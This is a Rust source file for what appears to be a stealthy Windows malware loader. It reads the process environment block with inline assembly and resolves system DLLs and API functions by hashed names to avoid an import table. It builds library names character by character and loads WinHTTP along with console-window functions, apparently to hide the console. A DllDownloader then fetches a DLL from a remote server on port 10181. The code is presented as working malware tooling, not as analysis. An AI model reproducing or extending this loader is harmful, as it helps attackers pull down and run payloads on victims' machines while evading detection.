#![feature(asm)]
#![allow(non_snake_case)]

use alloc::string::{String, ToString};
use alloc::{format, vec};
use alloc::vec::Vec;
use core::arch::asm;
use core::ffi::{c_void, CStr};
use core::mem::transmute;
use core::ptr::{null, null_mut};
use core::slice;
use crate::core_link::bootstrapper::Instance::get_instance;
use crate::core_link::bootstrapper::types::{DWORD, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS, LDR_DATA_TABLE_ENTRY, LIST_ENTRY, LoadLibraryAFn, PEB, WinHttpCloseHandleFn, WinHttpConnectFn, WinHttpOpenFn, WinHttpOpenRequestFn, WinHttpQueryDataAvailableFn, WinHttpReadDataFn, WinHttpReceiveResponseFn, WinHttpSendRequestFn};
use crate::core_link::bootstrapper::utils::{hash_djb2, HASH_GET_CONSOLE_WINDOW, HASH_LOAD_LIBRARY_A, HASH_SHOW_WINDOW, HASH_USER32, HASH_WIN_HTTP_CLOSE_HANDLE, HASH_WIN_HTTP_CONNECT, HASH_WIN_HTTP_OPEN, HASH_WIN_HTTP_OPEN_REQUEST, HASH_WIN_HTTP_QUERY_DATA_AVAILABLE, HASH_WIN_HTTP_READ_DATA, HASH_WIN_HTTP_RECEIVE_RESPONSE, HASH_WIN_HTTP_SEND_REQUEST, HASH_WINHTTP};

/*
    get peb
 */
#[link_section = ".text$B"]
pub(crate) fn get_peb() -> *const PEB {
    let PEB: *const PEB;
    unsafe {
        asm!(
        "mov {}, gs:[0x60]",
        out(reg) PEB,
        options(readonly, nostack, preserves_flags),
        );
    }
    PEB
}

#[link_section = ".text$B"]
pub fn get_dll(hash_module: u32) -> *const c_void {
    let peb = get_peb();
    unsafe {
        if !(*peb).ldr.is_null() {
            let mut module_list = &mut (*(*peb).ldr).in_memory_order_module_list as *mut LIST_ENTRY;
            let start = module_list; // 确保类型一致
            while !(*module_list).flink.is_null() && (*module_list).flink != start {
                // 从LIST_ENTRY 获取LDR_DATA_TABLE_ENTRY结构体指针
                // let ldr_entry_offset = offset_of!(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks) as isize;
                let ldr_entry_offset = 16;
                let entry = ((*module_list).flink as *const u8).offset(-ldr_entry_offset) as *const LDR_DATA_TABLE_ENTRY;
                let base_dll_name = (*entry).BaseDllName; // 获取模块名称
                let dll_base = (*entry).DllBase; // 获取模块基地址
                let entry_name_len = (base_dll_name.Length as usize) / 2; // Unicode 字符的数量
                let entry_name_ptr = base_dll_name.Buffer.0;
                let entry_name_slice = slice::from_raw_parts(entry_name_ptr, entry_name_len);
                let name = String::from_utf16(entry_name_slice).unwrap().to_lowercase();
                if hash_djb2(&*name) == hash_module {
                    return dll_base as *const c_void;
                }
                module_list = (*module_list).flink;
            }
        }
    }
    null_mut()
}

#[link_section = ".text$B"]
pub fn get_func_api(dll_base: *const c_void, hash_func :u32) -> *const c_void {
    unsafe {
        let dos_header = dll_base as *const _ as  *const IMAGE_DOS_HEADER;
        let nt_headers = dll_base.offset((*dos_header).e_lfanew as isize) as *const IMAGE_NT_HEADERS;
        let export_directory_rva = (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
        if export_directory_rva == 0 {
            return *null();
        }
        let export_directory_va = dll_base.offset(export_directory_rva as isize) as *const IMAGE_EXPORT_DIRECTORY;

        let count = (*export_directory_va).NumberOfNames;
        let names_rva = (*export_directory_va).AddressOfNames as isize;
        let names_va = dll_base.offset(names_rva) as *const u32;
        let ordinals_rva = (*export_directory_va).AddressOfNameOrdinals as isize;
        let ordinals_va = dll_base.offset(ordinals_rva) as *const u16;
        let addresses_rva = (*export_directory_va).AddressOfFunctions as isize;
        let addresses_va = dll_base.offset(addresses_rva) as *const u32;

        for i in 0..count {
            let name_rva = *names_va.offset(i as isize);
            let name_va = dll_base.offset(name_rva as isize) as *const i8;
            let func_name_cstr = CStr::from_ptr(name_va).to_str().ok().unwrap();

            if  hash_djb2(func_name_cstr) == hash_func {
                let ordinal_index = *ordinals_va.offset(i as isize) as isize;
                let func_rva = *addresses_va.offset(ordinal_index);
                let func_va = dll_base.offset(func_rva as isize);
                return func_va;
            }

        }
    }
    unsafe { *null_mut() }
}

#[link_section=".text$z"]
#[macro_export]
macro_rules! define_lazy_static_instance {
    ($name:ident, $type:ty, $init:expr) => {
        use core::cell::UnsafeCell;
        use spin::lazy::Lazy;
        use spin::Mutex;

        static $name: Lazy<Mutex<UnsafeCell<$type>>> = Lazy::new(|| {
            Mutex::new(UnsafeCell::new($init))
        });

        pub fn get_instance() -> &'static mut $type {
            let instance = $name.lock();
            unsafe { &mut *instance.get() }
        }
    };
}



//load_library
pub fn load_lib(hash_module: u32) {
    let ins = get_instance();
    let load_library: LoadLibraryAFn = unsafe { core::mem::transmute(ins.win_api.funcs[&HASH_LOAD_LIBRARY_A]) };
    if let Some(lib_name_str) = ins.hash_map.get(&hash_module) {
        unsafe {
            let dll_base = load_library(lib_name_str.clone().as_ptr() as *const i8);
            if dll_base == null_mut() {
            } else {
                ins.win_api.libs.insert(hash_module, dll_base as *const c_void);
            }
        }
    } else {
    }
}


pub fn init() {
    let mut ins = get_instance();
    let user32_name = {
        let name = ['U', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l'];
        name.iter().map(|&c| c as u8).collect::<Vec<u8>>()
    };
    let win_http = {
        let name = ['W', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l'];
        name.iter().map(|&c| c as u8).collect::<Vec<u8>>()
    };
    ins.hash_map.insert(HASH_USER32, user32_name);
    ins.hash_map.insert(HASH_WINHTTP,win_http);
    load_lib(HASH_USER32);
    load_lib(HASH_WINHTTP);
    unsafe {
        ins.win_api.load_func_addr(HASH_USER32,HASH_GET_CONSOLE_WINDOW);
        ins.win_api.load_func_addr(HASH_USER32,HASH_SHOW_WINDOW);
        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_OPEN);
        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_CONNECT);
        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_OPEN_REQUEST);
        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_SEND_REQUEST);
        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_RECEIVE_RESPONSE);
        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_QUERY_DATA_AVAILABLE);
        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_READ_DATA);
        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_CLOSE_HANDLE);
    }

}


pub struct DllDownloader {
    pub(crate) dll_data: Vec<u8>,
}

impl DllDownloader {
    pub fn get_request_dll(&mut self, server: &str, path: &str) -> Result<&[u8], String> {
        unsafe {
            let instance = get_instance();
            let win_http_open: WinHttpOpenFn = transmute(instance.win_api.funcs[&HASH_WIN_HTTP_OPEN]);
            let win_http_connect: WinHttpConnectFn = transmute(instance.win_api.funcs[&HASH_WIN_HTTP_CONNECT]);
            let win_http_open_req: WinHttpOpenRequestFn = transmute(instance.win_api.funcs[&HASH_WIN_HTTP_OPEN_REQUEST]);
            let win_http_send_req: WinHttpSendRequestFn = transmute(instance.win_api.funcs[&HASH_WIN_HTTP_SEND_REQUEST]);
            let win_http_recv_resp: WinHttpReceiveResponseFn = transmute(instance.win_api.funcs[&HASH_WIN_HTTP_RECEIVE_RESPONSE]);
            let win_http_query_data: WinHttpQueryDataAvailableFn = transmute(instance.win_api.funcs[&HASH_WIN_HTTP_QUERY_DATA_AVAILABLE]);
            let win_http_read_data: WinHttpReadDataFn = transmute(instance.win_api.funcs[&HASH_WIN_HTTP_READ_DATA]);
            let win_http_close: WinHttpCloseHandleFn = transmute(instance.win_api.funcs[&HASH_WIN_HTTP_CLOSE_HANDLE]);

            fn to_wide_string(s: &str) -> Vec<u16> {
                let mut wide: Vec<u16> = s.encode_utf16().collect();
                wide.push(0);
                wide
            }

            let user_agent = to_wide_string("WinHTTP Example");
            let h_session = win_http_open(user_agent.as_ptr(), 0, null_mut(), null_mut(), 0);
            if h_session.is_null() {
                return Err("Failed to open WinHTTP session".to_string());
            }

            let server_wide = to_wide_string(server);
            let h_connect = win_http_connect(h_session, server_wide.as_ptr(), 10181, 0);
            if h_connect.is_null() {
                win_http_close(h_session);
                return Err("Failed to connect to server".to_string());
            }

            let path_wide = to_wide_string(path);
            let h_request = win_http_open_req(h_connect, to_wide_string("GET").as_ptr(), path_wide.as_ptr(), null_mut(), null_mut(), null_mut(), 0);
            if h_request.is_null() {
                win_http_close(h_connect);
                win_http_close(h_session);
                return Err("Failed to open request".to_string());
            }

            // Send the request
            if win_http_send_req(h_request, null_mut(), 0, null_mut(), 0, 0, 0) == 0 {
                win_http_close(h_request);
                win_http_close(h_connect);
                win_http_close(h_session);
            }

            // Receive the response
            if win_http_recv_resp(h_request, null_mut()) == 0 {
                win_http_close(h_request);
                win_http_close(h_connect);
                win_http_close(h_session);
            }

            // Read the response data
            let mut buffer: [u8; 8192] = [0; 8192];
            let mut bytes_read: u32 = 0;
            while win_http_query_data(h_request, &mut bytes_read) != 0 && bytes_read > 0 {
                let mut read: u32 = 0;
                if win_http_read_data(h_request, buffer.as_mut_ptr() as *mut c_void, bytes_read, &mut read) == 0 {
                    break;
                }
                self.dll_data.extend_from_slice(&buffer[..read as usize]);
            }

            // Close handles
            win_http_close(h_request);
            win_http_close(h_connect);
            win_http_close(h_session);

            Ok(&self.dll_data)
        }
    }
}





